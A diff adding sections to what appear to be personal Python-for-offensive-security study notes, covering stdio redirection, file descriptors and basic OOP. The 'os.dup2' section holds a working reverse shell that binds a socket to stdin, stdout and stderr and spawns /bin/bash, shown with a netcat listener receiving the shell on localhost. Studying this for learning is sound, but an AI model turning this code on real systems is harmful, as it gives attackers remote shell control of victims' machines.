@@ -189,6 +189,17 @@
       - [Timeout-Based Non-Blocking Socket](#timeout-based-non-blocking-socket)
       - [select.select() Based recvall](#selectselect-based-recvall)
       - [select.select() recvall()](#selectselect-recvall)
+    - [stdio](#stdio)
+      - [Input, Output, and Error File Descriptors](#input-output-and-error-file-descriptors)
+      - [STDIN, STDOUT, STDERR](#stdin-stdout-stderr)
+      - [STDOUT, STDIN are File](#stdout-stdin-are-file)
+      - [Sockets are similar to Files](#sockets-are-similar-to-files)
+      - [os.dup2(src, dest)](#osdup2src-dest)
+      - [Replace stdout with a Socket](#replace-stdout-with-a-socket)
+    - [OOP](#oop)
+      - [Accessing the variable](#accessing-the-variable)
+      - [Adding Attributes](#adding-attributes)
+      - [Calling the Parent init](#calling-the-parent-init)
 
 
 ---
@@ -2879,3 +2890,195 @@ subprocess.run(f"ping -c 1 {ip}".split(), capture_output=True).stdout
 ...     return data
 ```
 
+### stdio
+
+#### Input, Output, and Error File Descriptors
+
+```python
+>>> import sys
+>>> dir(sys)
+['__breakpointhook__', '__displayhook__', '__doc__', '__excepthook__', '__interactivehook__', '__loader__', '__name__', '__package__', '__spec__', '__stderr__', '__stdin__', '__stdout__', '__unraisablehook__', '_base_executable', '_clear_type_cache', '_current_exceptions', '_current_frames', '_debugmallocstats', '_framework', '_getframe', '_getframemodulename', '_git', '_home', '_setprofileallthreads', '_settraceallthreads', '_stdlib_dir', '_xoptions', 'abiflags', 'activate_stack_trampoline', 'addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'copyright', 'deactivate_stack_trampoline', 'displayhook', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exception', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'get_int_max_str_digits', 'getallocatedblocks', 'getdefaultencoding', 'getdlopenflags', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'getunicodeinternedsize', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'is_stack_trampoline_active', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'monitoring', 'orig_argv', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'platlibdir', 'prefix', 'ps1', 'ps2', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'set_int_max_str_digits', 'setdlopenflags', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdlib_module_names', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions']
+```
+
+#### STDIN, STDOUT, STDERR
+
+```python
+>>> import sys
+>>> type(sys.stdout)
+<class '_io.TextIOWrapper'>
+>>> dir(sys.stdout)
+['_CHUNK_SIZE', '__class__', '__del__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__next__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_checkClosed', '_checkReadable', '_checkSeekable', '_checkWritable', '_finalizing', 'buffer', 'close', 'closed', 'detach', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'line_buffering', 'mode', 'name', 'newlines', 'read', 'readable', 'readline', 'readlines', 'reconfigure', 'seek', 'seekable', 'tell', 'truncate', 'writable', 'write', 'write_through', 'writelines']
+```
+
+#### STDOUT, STDIN are File
+
+```bash
+┌──(automated_offense)─(d41y㉿user)-[~]
+└─$ cat writefile.py                                                        
+import sys
+outfile = open("outfile.txt", "w")
+sys.stdout = outfile
+print("Write this to a file")
+outfile.flush()
+outfile.close()
+                                                                                           
+┌──(automated_offense)─(d41y㉿user)-[~]
+└─$ python writefile.py             
+                                                                                           
+┌──(automated_offense)─(d41y㉿user)-[~]
+└─$ cat outfile.txt            
+Write this to a file
+
+...
+
+┌──(automated_offense)─(d41y㉿user)-[~]
+└─$ cat readfile.py 
+import sys
+infile = open("outfile.txt")
+sys.stdin = infile
+x = input("")
+print("The file says " + x)
+                                                                                           
+┌──(automated_offense)─(d41y㉿user)-[~]
+└─$ python readfile.py 
+The file says Write this to a file
+
+# stdin and stdout can be treated like files
+# redirecting sys.stdout replaces screen with a file
+# redirecting sys.stdin replaces keyboard with a file
+```
+
+#### Sockets are similar to Files
+
+```python
+>>> import sys, socket
+>>> s = socket.socket()
+>>> s.connect(("127.0.0.1", 9000))
+>>> s.fileno()
+3
+>>> sys.stdout.fileno()
+1
+>>> sys.stdin.fileno()
+0
+>>> sys.stderr.fileno()
+2
+# sockets have file descriptors just like files
+```
+
+#### os.dup2(src, dest)
+
+```bash
+┌──(d41y㉿user)-[~]
+└─$ cat osdup.py                                                            
+import socket, os, pty
+s = socket.socket()
+s.connect(("127.0.0.1", 9000))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+```
+
+```bash
+┌──(d41y㉿user)-[~]
+└─$ sudo nc -lnvp 9000
+Listening on 0.0.0.0 9000
+Connection received on 127.0.0.1 44998
+d41y@user:~$ id
+id
+uid=1001(d41y) gid=1001(d41y) Gruppen=1001(d41y),27(sudo),100(users),135(docker)
+d41y@user:~$ cd ..
+cd ..
+d41y@user:/home$
+```
+
+```python
+# alternative last lines in the code
+# subprocess.Popen((["/bin/sh", "-i"]))
+# subprocess.call("/bin/bash")
+```
+
+#### Replace stdout with a Socket
+
+```python
+>>> import socket, sys
+>>> s = socket.socket()
+>>> sys.stdout = s
+>>> print("Hello")
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+AttributeError: 'socket' object has no attribute 'write'
+# the socket is missing the .write() method
+>>> sys.stdin = s
+>>> input()
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+AttributeError: 'socket' object has no attribute 'readline'
+# the socket is missing the .readline() method
+```
+
+### OOP
+
+#### Accessing the variable
+
+```python
+>>> class NewList(list):
+...     def sayhi(the_var):
+...             print("Hello variable ", the_var)
+...     def len(the_var):
+...             return len(the_var)
+... 
+>>> x = NewList([1,2,3,4,5,6,7,8])
+>>> y = NewList(["list", "of", "strings"])
+>>> x.sayhi()
+Hello variable  [1, 2, 3, 4, 5, 6, 7, 8]
+>>> y.sayhi()
+Hello variable  ['list', 'of', 'strings']
+>>> x.len()
+8
+>>> y.len()
+3
+```
+
+#### Adding Attributes
+
+```python
+>>> x = NewList([1,2,3])
+>>> x.NAME = "NumberList"
+>>> x.NAME
+'NumberList'
+>>> dir(x)
+['NAME', '__add__', '__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__module__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'len', 'pop', 'remove', 'reverse', 'sayhi', 'sort']
+# can set new attributes on most objects at any time
+```
+
+```python
+>>> class NewList(list):
+...     def __init__(self, a_name):
+...             self.NAME = a_name
+... 
+>>> x.NewList("ListOfNumbers")
+>>> x = NewList("ListOfNumbers")
+>>> x.extend([4,5,6,7])
+>>> x
+[4, 5, 6, 7]
+>>> x.NAME
+'ListOfNumbers'
+# __init__ is called when you create a new instance of an object
+# can use __init__ to set attributes on new instances when they are created
+```
+
+#### Calling the Parent init
+
+```python
+>>> class NewList(list):
+...     def __init__(self, a_name, parent_stuff):
+...             self.NAME = a_name
+...             super().__init__(parent_stuff)
+... 
+>>> x = NewList("ListOfNumber", [1,2,3,4,5])
+>>> x.NAME
+'ListOfNumber'
+>>> x
+[1, 2, 3, 4, 5]
+```
